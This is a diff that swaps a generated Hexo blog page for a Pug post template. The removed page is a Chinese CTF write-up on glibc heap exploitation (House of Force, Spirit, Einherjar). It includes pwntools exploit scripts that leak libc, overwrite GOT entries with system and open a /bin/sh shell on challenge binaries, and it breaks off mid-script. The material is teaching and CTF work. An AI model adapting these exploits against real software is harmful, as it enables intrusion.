@@ -1,437 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>house-of-xxx技术 - Watch Security</title>
-
-<meta name="keywords" content="house of xxx">
-
-<meta name="description " content="堆漏洞利用的不同于unlink的新思路">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-09-06">2019-09-06</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">House-of-xxx技术</h2>
-            <div class="post-meta">
-                本文总共8740个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="House-of-xxx技术"><a href="#House-of-xxx技术" class="headerlink" title="House of  xxx技术"></a>House of  xxx技术</h3><h4 id="利用基础"><a href="#利用基础" class="headerlink" title="利用基础"></a>利用基础</h4><ul>
-<li>理解glibc的malloc机制（不同于unlink基于free机制）</li>
-</ul>
-<h4 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h4><ul>
-<li><p>主要思路</p>
-<ul>
-<li>利用malloc从top chunk内切取返回，而top chunk随着切取而变化的特点。</li>
-<li>当我们能够控制top chunk的size后，进一步可以控制top chunk指针，也就是控制了下一次malloc的地址。达到任意写的目的</li>
-</ul>
-</li>
-<li><h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><ul>
-<li>存在可溢出的chunk1，可以用来修改top chunk的size值为一个极大的值。</li>
-<li>任意的malloc得到chunk2，并且malloc的size可以自己控制（不会限制size大小）</li>
-<li>再malloc一次得到chunk3的地址写入数据。</li>
-<li>上面的三个是该技术的利用前提，其中第二条一般难以满足。</li>
-</ul>
-</li>
-<li><h5 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h5><ul>
-<li>为何修改top chunk的size值为大值（一般是-1，也即0xffffffffffffffff）<ul>
-<li>由于glibc在malloc时，会检查当前top chunk的大小用来切割出去是否充足。不足的话，就会根据分配区的特点进行调整，达不到我们想要malloc 任意大小的目的，所以需要伪造size极大。</li>
-</ul>
-</li>
-<li>之后malloc的参数size的大小如何确定<ul>
-<li>首先要明确分配这个chunk2是用来达到控制top chunk指针到我们目的地址附近的，top_chunk和target_addr存在以下关系。简言之就是，我们希望分配chunk2=malloc(size)之后，top_chunk能移动到target_addr - 0x10的位置（0x10是chunk3的head部分)。</li>
-<li>即是size = target_addr - 0x10 - top_chunk</li>
-</ul>
-</li>
-<li>一般target_addr会是一些函数地址指针如got表项。那么当进行chunk2 = malloc(size)之前的top_chunk值怎么获得呢。<ul>
-<li>泄露chunk地址。<ul>
-<li>当read内容没有’\x00’截断的时候，或许可行。</li>
-</ul>
-</li>
-<li>另种方法，heap是随机的，所以top chunk也是随机的。但是top chunk的变化是规律的，与heap_base之间存在着已经分配的空间大小的差值。即top_chunk = heap_base + size-of-malloc’d。所以，换一个思路，我们的让target_addr也与heap_base产生关联。例如，第一次分配的chunk与heap_base之间的关系：chunk = heap_base + 0x10。如此，size的大小就可以确定了，而无需知道top chunk的地址。这种方法依赖于程序将某函数指针存在heap里，并且可以调用。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><ul>
-<li><p>hitcontrain_lab11的bamboobox题目</p>
-<ul>
-<li><p>题目流程分析</p>
-<ul>
-<li>标准的heap题目，提供add，change，remove，show功能。</li>
-<li>关键点A，malloc了一块heap地址，存放两个函数地址。</li>
-</ul>
-<p>​    <img src="/2019/09/06/House-of-xxx技术/1.png" title="[]"></p>
-<ul>
-<li>关键点B，change函数，可以重新写chunk，而没有重新malloc地址；有溢出。</li>
-</ul>
-</li>
-</ul>
-<p>​           <img src="/2019/09/06/House-of-xxx技术/2.png" title="[]"></p>
-<ul>
-<li>利用exp</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">first_size = <span class="number">0x110</span></span><br><span class="line">add_item(first_size, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#over flow the chunk0 to cover the topchunk with size = -1</span></span><br><span class="line">change_item(<span class="number">0</span>, first_size+<span class="number">0x10</span>, <span class="string">'a'</span>*first_size + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#size = target_addr - top_chunk_addr - 0x10(for chunk head)</span></span><br><span class="line"><span class="comment">#where top_chunk_addr = heap_base + 0x20 + 0x90			(malloc'd before)</span></span><br><span class="line"><span class="comment">#here my target_addr is heap_base + 0x10; so i neednot know the top_chunk_addr</span></span><br><span class="line"><span class="comment">#size = (heap_base + 0x10) - (heap_base + 0x20 + 0x90) - 0x10 = -0x110</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#why target_addr is heap_base + 0x10,  because there is a function_addr which will be called</span></span><br><span class="line"></span><br><span class="line">size = -(first_size+<span class="number">0x10</span>+ <span class="number">0x10</span> + <span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"size ==&gt; "</span> + hex(size)</span><br><span class="line">add_item(size, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x400D49</span></span><br><span class="line">add_item(<span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">8</span> + p64(magic_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.sendline(<span class="string">'5'</span>)				<span class="comment">#now call magic</span></span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2016_bctf_bcloud</p>
-<ul>
-<li><p>流程分析</p>
-<ul>
-<li><p>提供add, edit, delete功能，show是无效的。也即我们需要通过别的方法达到泄露信息的目的。</p>
-</li>
-<li><p>关键A，分配name堆，strcpy的使用导致可泄露堆地址（为何），间接可计算出top chunk的地址。</p>
-<img src="/2019/09/06/House-of-xxx技术/3.png" title="[]">
-</li>
-<li><p>关键B，这里两个堆，在栈上的数据溢出导致堆溢出，也就可以达到修改top_chunk的目的。</p>
-<img src="/2019/09/06/House-of-xxx技术/4.png" title="[]">
-</li>
-<li><p>关键C，目的地址的确定，这里有很好的示范，即一般类型的题目都会提供的一个全局数组指针，我们如果可以修改该数组内的堆指针，也就可以达到任意地址写的目的。</p>
-</li>
-</ul>
-</li>
-<li><p>exp记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak_heap</span></span><br><span class="line">p.sendafter(<span class="string">'Input your name:\n'</span>, <span class="string">'a'</span> * <span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">heapbase = u32(p.recv(<span class="number">4</span>))- <span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heapbase ==&gt; "</span>+ hex(heapbase)</span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">"Org:"</span>)</span><br><span class="line">p.send(<span class="string">"a"</span>*<span class="number">0x40</span>)</span><br><span class="line">p.readuntil(<span class="string">"Host:"</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0xffffffff</span>))</span><br><span class="line">p.readuntil(<span class="string">"Enjoy:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#modify top chunk to target_addr</span></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">size_ptr = <span class="number">0x0804B0A0</span></span><br><span class="line"></span><br><span class="line">target_addr = size_ptr - <span class="number">8</span></span><br><span class="line">topchunk_addr = heapbase + (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="number">3</span></span><br><span class="line">size = target_addr - <span class="number">4</span> <span class="number">-7</span> - topchunk_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_size ==&gt; "</span> + hex(size)</span><br><span class="line">addck(size<span class="number">-4</span>, <span class="string">'a'</span>)							<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#size_ptr[0] = size_ptr[1] = size_ptr[2] = 16</span></span><br><span class="line"><span class="comment">#content_ptr[0] = free_got; content_ptr[1] = content_ptr[2] = atoi_got</span></span><br><span class="line">payload = (p32(<span class="number">16</span>)*<span class="number">3</span>).ljust(content_ptr-size_ptr, <span class="string">'a'</span>) + p32(free_got) + p32(atoi_got) + p32(atoi_got)</span><br><span class="line">addck(<span class="number">0x100</span>, payload)						<span class="comment">#1</span></span><br><span class="line">editck(<span class="number">0</span>, p32(puts_plt))					<span class="comment">#puts_plt ==&gt; free_got</span></span><br><span class="line">delck(<span class="number">1</span>)</span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi ==&gt; "</span> + hex(atoi_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system ==&gt; "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cover atoi_got ==&gt; system</span></span><br><span class="line">editck(<span class="number">2</span>, p32(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h4><ul>
-<li><p>主要思路</p>
-<ul>
-<li><p>基于fastbin，LIFO的特点，即最后一次free的地址，会参与下一次的malloc的特点。结合栈溢出，修改malloc得到的指针，free掉伪造的指针。那么下一次malloc就可以得到该伪造地址的指针。</p>
-</li>
-<li><p>利用条件</p>
-<ul>
-<li>存在溢出，可以修改malloc得到的指针，将该指针伪造为fast bin块。</li>
-<li>可以伪造下一个chunk的size，通过检查（大于2 * SIZE_SZ，小于av-&gt;system_mem）</li>
-<li>可以继续malloc，得到伪造的地址。并能写入数据。</li>
-</ul>
-</li>
-<li><p>利用细节</p>
-<ul>
-<li>关于size检查，在源码展示</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>为什么是要伪造为fastbin，是因为fastbin的LIFO机制，使得我们在size一致的前提下，最后释放的chunk，最先得到重复使用。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>实践习题</p>
-<ul>
-<li><p><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="noopener">hack-lu-ctf-2014-oreo</a></p>
-<ul>
-<li><p>题目分析</p>
-<ul>
-<li><p>清单系统，提供add 、 submit、order、之类的操作。类似其他heap题目背景流程。我们操作的对象的结构如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rile[0x38]	    offset  name            size</span><br><span class="line">				0x00: description		0x38</span><br><span class="line">				0x19: name				0x38</span><br><span class="line">				0x34: next				4</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>  - 漏洞点A，程序实现的read函数存在无&apos;\x00&apos;截断的问题，可用来泄露信息。
-
-    {% asset_img 6.png [] %}
-
-    {% asset_img 7.png [] %}
-
-  - 漏洞点B，name和description字段的可输入数据均可实现溢出覆盖下一个chunk（next指针）
-
-    {% asset_img 8.png [] %}
-
-  - House of spirit利用基础
-
-    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、可以覆盖伪造next指针，即可以欺骗free一个伪造的地址</span><br><span class="line">2、该地址需要满足对当前chunk的size的检查0x41，和下一个chunk的size的检查（范围）</span><br></pre></td></tr></table></figure>
-
-    {% asset_img 9.png [] %}
-
-    可以看到，rfileCnt随着add操作递增（可以伪造为0x41），notice我们可控。所以只需要修改notice的指针内容，我们就能够实现任意地址写。也就是说fake_chunk的是notice。
-
-    即下面的布置
-
-    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk ===&gt;</span><br><span class="line">0x0804A2A0		prev_size ordersCnt</span><br><span class="line">0x0804A2A4	    size      rfileCnt</span><br><span class="line">0x0804A2A8		mem		  notice</span><br><span class="line">				.................</span><br><span class="line">		</span><br><span class="line">0x0804A2A4						   next_chunk_size</span><br></pre></td></tr></table></figure>
-
-  - 注意，0x0804A2A4的位置的覆盖不是写入notice实现的，而是写入notice指向的地址实现的。
-
-  - 在内存中的布局
-
-    {% asset_img 5.png [] %}
-
-* exp记录
-
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sscanf_got = <span class="number">0x0804A258</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x1b</span> + p32(sscanf_got<span class="number">-25</span>), <span class="string">'descrip'</span>)				<span class="comment">#cover file0 file0-&gt;next = 0</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">sscanf_addr = u32(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sscanf_addr ==&gt; "</span> + hex(sscanf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = sscanf_addr - libc.symbols[<span class="string">'__isoc99_sscanf'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr ==&gt; "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span><span class="number">-1</span>):</span><br><span class="line">	add(<span class="string">'a'</span>, <span class="string">'u'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#now cnt = 0x40, fake_size</span></span><br><span class="line">fake_heap = <span class="number">0x0804A2A0</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1b</span> + p32(fake_heap+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x08048A25'</span>)</span><br><span class="line">add(payload, <span class="string">'descrip'</span>)</span><br><span class="line"><span class="comment">#now cnt = 0x41</span></span><br><span class="line">dbg()</span><br><span class="line">msg = p32(<span class="number">0</span>)*<span class="number">9</span> + p32(<span class="number">0x41</span>)	<span class="comment">#  0x804A2E4 fake next chunk_size</span></span><br><span class="line">message(msg)</span><br><span class="line"></span><br><span class="line">order()							<span class="comment">#spriti to malloc return the notice</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'name'</span>, p32(sscanf_got))</span><br><span class="line">message(p32(system_addr))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-</code></pre><h4 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h4><ul>
-<li><p>主要思路</p>
-<ul>
-<li>和house of force的区别是，通过off by one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top chunk进行合并操作的时候失败。然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址  。</li>
-<li>注意伪造的chunk的size字段应和最后一个chunk的prev_size字段一致。</li>
-</ul>
-</li>
-<li><p><a href="https://github.com/blendin/writeups/tree/master/2016/tinypad" target="_blank" rel="noopener">题目实例</a></p>
-<ul>
-<li><p>题目分析</p>
-<ul>
-<li><p>泄露信息</p>
-<img src="/2019/09/06/House-of-xxx技术/11.png" title="[]">
-<p>这里在free后并没有null；故可以借助双向链表的结构输出main_arena和chunk_heap的地址。进而根据偏移量计算求得libc基地址和heap基地址。</p>
-</li>
-<li><p>off by one漏洞</p>
-<img src="/2019/09/06/House-of-xxx技术/12.png" title="[]">
-</li>
-<li><p>house of einherjar利用</p>
-<ul>
-<li><p>伪造chunk，edit功能提供向tinypad头部copy和修改的权限，可以构造fake_chunk</p>
-<img src="/2019/09/06/House-of-xxx技术/13.png" title="[]">
-</li>
-<li><p>基本步骤，在泄露地址后，1、3空闲，此时如果delete(4)就会触发和3的合并；只剩2。</p>
-<p>此时再add一个大小合适的块，就是1。利用off by one 漏洞和house of einherjar技术伪造块2的size和prev_size，欺骗glibc以为2块前的fake_chunk空闲，但是如果想要触发合并，还需要伪造fake_chunk的size和2的prev_size一致，这可以通过edit(2)实现。最终delete(2)使得top_chunk指向tinypad，malloc(0x100)将返回tinypad+0x10，可编辑的范围可以覆盖pad1的地址。即任意地址写，这里将__free_hook写入gadgets以绕过FULL RELRO。</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>exp记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc and heap address</span></span><br><span class="line">   add(p, <span class="number">224</span>, <span class="string">"a"</span>*<span class="number">10</span>)</span><br><span class="line">   add(p, <span class="number">246</span>, <span class="string">"b"</span>*<span class="number">0xf0</span>)</span><br><span class="line">   